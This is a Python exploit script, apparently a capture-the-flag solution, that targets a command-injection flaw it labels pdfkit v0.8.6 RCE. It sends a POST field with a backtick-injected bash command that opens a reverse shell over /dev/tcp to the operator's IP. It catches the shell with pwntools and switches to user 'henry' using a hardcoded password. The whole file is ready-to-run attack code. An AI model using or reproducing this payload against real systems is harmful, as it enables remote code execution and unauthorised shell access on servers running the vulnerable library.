#!/usr/bin/python3

import requests
import signal
import pdb # Debugging Purposes
import sys
import time
import subprocess
import atexit
import multiprocessing
import argparse
from pwn import log, listen

class Exploit:

    def __init__(self, url, lport, ip_address):

        self.url = url
        self.lport = lport
        self.ip_address = ip_address
        self.http_server = subprocess.Popen(["python3", "-m", "http.server", "80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def def_handler(self, sig, frame):
        sys.exit(1)

    def cleanup(self):

        if self.http_server.poll() is None:
            self.http_server.kill()

    def makeRequest(self):

        post_data = {
            'url': f'http://{self.ip_address}/?name=%20`bash -c "bash -i >& /dev/tcp/{self.ip_address}/{self.lport} 0>&1"`'
        }

        try:
            r = requests.post(self.url, data=post_data)

        except requests.exceptions.RequestException as e:
            log.error(f"Ha habido un error de tipo: {e}")

    def run(self):

        signal.signal(signal.SIGINT, self.def_handler)
        atexit.register(self.cleanup)

        try:
            proc = multiprocessing.Process(target=self.makeRequest)
            proc.start()

        except Exception as e:
            log.error(str(e))
            self.cleanup()
            sys.exit(1)

        with listen(self.lport, timeout=20) as shell:
            if shell.wait_for_connection():
                print()
                shell.sendline("su henry")
                time.sleep(0.1)
                shell.sendline("Q3c1AqGHtoI0aXAYFH")
                shell.interactive()

def get_arguments():

    parser = argparse.ArgumentParser(description='pdfkit v0.8.6 Exploit [RCE]')

    parser.add_argument('-u', '--url', dest='url', required=True, help='Proporcionar dirección URL a explotar')
    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto para la Reverse Shell')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='Dirección IP para la Reverse Shell')

    return parser.parse_args()

def main():

    args = get_arguments()

    exploit = Exploit(args.url, args.lport, args.ip_address)
    exploit.run()

if __name__ == '__main__':

    main()
